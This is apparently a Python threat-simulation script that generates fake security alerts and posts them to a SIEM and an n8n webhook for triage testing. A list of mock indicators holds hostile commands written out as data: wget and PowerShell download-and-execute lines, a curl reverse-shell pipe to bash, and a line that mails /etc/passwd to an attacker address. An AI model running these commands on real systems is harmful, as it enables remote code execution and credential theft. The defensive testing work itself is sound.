import os
import time
import random
import datetime
import requests
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("ThreatGenerator")

SIEM_URL = os.environ.get("SIEM_URL", "http://localhost:8000")
N8N_WEBHOOK_URL = os.environ.get("N8N_WEBHOOK_URL", "")

# Fallback threat lists if URLhaus API is offline or rate-limited
MOCK_MALICIOUS_URLS = [
    "http://paypal-verification-login-service.info/update/login.html",
    "https://dropbox-shared-file-view.net/invoice_38891.exe",
    "http://corporate-it-support-password-reset.com/portal/index.php"
]

MOCK_IPS = [
    "185.220.101.5",   # Tor Exit node (often used for scans)
    "91.191.209.124",  # Known SSH scanner
    "45.143.203.14",   # Known brute-force botnet IP
    "198.51.100.72"    # Simulated external malicious host
]

MOCK_COMMANDS = [
    "wget http://malware-download-cdn.net/elf_payload -O /tmp/bin && chmod +x /tmp/bin && /tmp/bin",
    "curl -s http://reverse-shell-relay.ru:4444/connect | bash",
    "cat /etc/passwd | mail -s 'server passwords' attacker@malicious-domain.com",
    "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://evil-server.org/agent.exe' -OutFile '$env:TEMP\\agent.exe'; Start-Process '$env:TEMP\\agent.exe'\""
]

def fetch_urlhaus_live_threats():
    """Fetch the latest active malware URLs from URLhaus (abuse.ch)."""
    logger.info("Querying URLhaus API for live threat feeds...")
    try:
        # Fetch recent URLs from URLhaus
        response = requests.get("https://urlhaus-api.abuse.ch/v1/recent/", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("query_status") == "ok":
                urls = []
                for entry in data.get("urls", []):
                    # Only take active/online malicious links
                    if entry.get("url_status") == "online":
                        urls.append(entry.get("url"))
                
                logger.info(f"Successfully retrieved {len(urls)} live online malware URLs from URLhaus.")
                return urls
    except Exception as e:
        logger.warning(f"Could not reach URLhaus API: {str(e)}. Using fallback mock threat feeds.")
    
    return MOCK_MALICIOUS_URLS

def generate_random_alert(live_urls):
    """Compile a structured alert payload cycling through threat vectors."""
    alert_type = random.choice(["URL", "IP", "COMMAND"])
    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
    
    if alert_type == "URL":
        target_url = random.choice(live_urls)
        details = (
            f"An internal employee host clicked an inbound link containing reputation indicators. "
            f"Cross-referencing verified public blocklists shows this URL is currently online and active."
        )
        return {
            "title": "Malicious URL Click Detected",
            "severity": "HIGH",
            "timestamp": timestamp,
            "indicator": target_url,
            "indicator_type": "URL",
            "details": details
        }
        
    elif alert_type == "IP":
        src_ip = random.choice(MOCK_IPS)
        usernames = ["admin", "root", "ubuntu", "user", "support", "test"]
        details = (
            f"Security syslog reports 30+ failed login connections to server 'srv-prod-web-01' "
            f"using usernames: {', '.join(random.sample(usernames, 3))}. Brute force signature matched."
        )
        return {
            "title": "SSH Brute-Force Intrusion Scan",
            "severity": "MEDIUM",
            "timestamp": timestamp,
            "indicator": src_ip,
            "indicator_type": "IP",
            "details": details
        }
        
    else:  # COMMAND
        command = random.choice(MOCK_COMMANDS)
        details = (
            f"Local process monitoring agent intercepted a suspicious execution tree from "
            f"parent process: 'nginx' (user: www-data). Indicator contains execution command lines."
        )
        return {
            "title": "Web Shell Execution Detected",
            "severity": "CRITICAL",
            "timestamp": timestamp,
            "indicator": command,
            "indicator_type": "Command",
            "details": details
        }

def start_simulation():
    """Run a continuous loop seeding the SIEM with live threat telemetry."""
    logger.info("Initializing Threat Simulation Daemon...")
    logger.info(f"Target SIEM API: {SIEM_URL}")
    if N8N_WEBHOOK_URL:
        logger.info(f"Target n8n Webhook: {N8N_WEBHOOK_URL}")
    else:
        logger.info("n8n Webhook not set. Alerts will be posted to the SIEM, requiring manual/scheduled pulls.")
        
    # Get initial feed of URLhaus URLs
    live_urls = fetch_urlhaus_live_threats()
    
    loop_count = 0
    while True:
        try:
            # Refresh live threat feeds every 30 loops (approx. every 20 minutes)
            if loop_count > 0 and loop_count % 30 == 0:
                live_urls = fetch_urlhaus_live_threats()
                
            # Compile new threat
            alert = generate_random_alert(live_urls)
            logger.info(f"Generated new threat alert: [{alert['title']}] -> {alert['indicator']}")
            
            # 1. Post to SIEM Database
            response = requests.post(f"{SIEM_URL}/api/alerts", json=alert, timeout=5)
            if response.status_code == 200:
                created_alert = response.json()
                alert_id = created_alert.get("id")
                logger.info(f"SIEM successfully registered alert ID: {alert_id}")
                
                # 2. Trigger n8n Webhook (if configured)
                if N8N_WEBHOOK_URL:
                    logger.info("Triggering n8n triage workflow...")
                    webhook_payload = created_alert
                    try:
                        wh_res = requests.post(N8N_WEBHOOK_URL, json=webhook_payload, timeout=5)
                        logger.info(f"n8n webhook response: {wh_res.status_code} - {wh_res.text}")
                    except Exception as e:
                        logger.error(f"Failed to trigger n8n webhook: {str(e)}")
            else:
                logger.error(f"Failed to post to SIEM: {response.status_code} - {response.text}")
                
        except Exception as e:
            logger.error(f"Simulation loop error: {str(e)}")
            
        loop_count += 1
        # Sleep 30 minutes between attacks (1800 seconds) to prevent overloading the VM and API limits
        time.sleep(1800)

if __name__ == "__main__":
    start_simulation()
